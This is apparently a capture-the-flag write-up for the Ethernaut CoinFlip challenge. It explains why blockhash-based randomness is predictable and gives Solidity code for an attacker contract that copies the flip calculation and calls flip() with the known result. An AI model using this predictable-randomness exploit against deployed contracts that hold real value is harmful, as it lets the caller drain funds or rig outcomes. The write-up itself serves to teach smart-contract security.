This challenge highlights the lack of randomness on the blockchain.

We're given a contract that flips a coin and we need to correctly guess its result 10 times in a row.

The contract, `CoinFlip` chooses its result using simple arithmetic.
1. It gets the blockhash of the last block
```javascript
uint256 blockValue = uint256(blockhash(block.number.sub(1)))
```
2. And divides it by a hardcoded `FACTOR`
```javascript
uint256 coinFlip = blockValue.div(FACTOR)
bool side = coinFlip == 1 ? true : false;
```

So to guess what side is going to come up, we just need to do the same math.

Note, the key here is that the blockhash is available to us outside of this contract - there is no inherit randomness in the coin flipping algorithm.

## Solution
Open up an IDE like Remix.

1. Copy the contents of the CoinFlip contract
2. Create a near identical contract that replicates the flipping algorithm. We'll do the same math:
```javascript
contract WeightedCoin {

    CoinFlip oldContract = CoinFlip(/*< your instance address >*/)
    using SafeMath for uint256;
    uint lastHash;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function cheat() public {
        // grab the blockhash
        uint blockValue = uint256(blockhash(block.number.sub(1)));

        // this has to be run on a different block each time
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        // implement same flipping logic
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
    }
}
```
3. Here's the magic: using our contract instance from Ethernaut, we can call the `CoinFlip` contract's `flip()` method with a guess we know will be true
 ```javascript
// add this to the end of "cheat"
oldContract.flip(side)
 ```  
 4. Repeat step 3. 9 more times.